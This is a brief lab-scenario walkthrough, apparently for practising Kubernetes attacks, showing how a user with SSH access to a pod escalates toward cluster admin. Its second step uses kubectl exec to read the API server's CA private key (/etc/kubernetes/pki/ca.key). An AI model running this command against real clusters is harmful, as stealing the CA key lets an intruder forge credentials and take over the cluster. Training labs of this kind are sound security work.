# SSH to Cluster Admin

### Compromising the cluster

This scenario begins with ssh access to a pod. The ssh credentials can be found in the scenario setup.

1. Get list of pods in kube-system namespace `kubectl get po -n kube-system` 
2. Grab the certificate `kubectl -n kube-system exec [API_SERVER_POD] -- cat /etc/kubernetes/pki/ca.key`
3. Profit!
